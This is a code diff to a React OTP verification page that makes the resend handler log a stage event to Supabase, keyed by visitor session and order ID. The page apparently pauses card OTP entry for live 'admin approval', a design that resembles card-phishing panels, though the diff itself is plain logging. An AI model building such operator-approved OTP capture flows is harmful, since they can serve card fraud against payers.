@@ -3,6 +3,7 @@ import { useNavigate, useLocation } from "react-router-dom";
 import { motion } from "framer-motion";
 import { Lock, RefreshCw, Loader2, CreditCard, Shield, Info } from "lucide-react";
 import { useAdminApproval, createOrUpdateStage } from "@/hooks/useAdminApproval";
+import { supabase } from "@/integrations/supabase/client";
 import { toast } from "sonner";
 import { useLanguage } from "@/i18n/LanguageContext";
 import WaitingApprovalOverlay from "@/components/WaitingApprovalOverlay";
@@ -56,9 +57,27 @@ const OTPVerification = () => {
     setWaitingApproval(true);
   };
 
-  const handleResend = () => {
+  const handleResend = async () => {
     setTimer(120); setCanResend(false); setOtp("");
     inputRef.current?.focus();
+
+    const visitorSid = sessionStorage.getItem("visitor_sid");
+    if (!orderId || !visitorSid) return;
+
+    try {
+      await supabase.rpc("insert_stage_event", {
+        p_visitor_session_id: visitorSid,
+        p_order_id: orderId,
+        p_stage: "otp",
+        p_status: "pending",
+        p_payload: {
+          resend_requested: true,
+          source: "otp_page",
+        },
+      });
+    } catch (error) {
+      console.error("Failed to log OTP resend request", error);
+    }
   };
 
   const fmtTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;
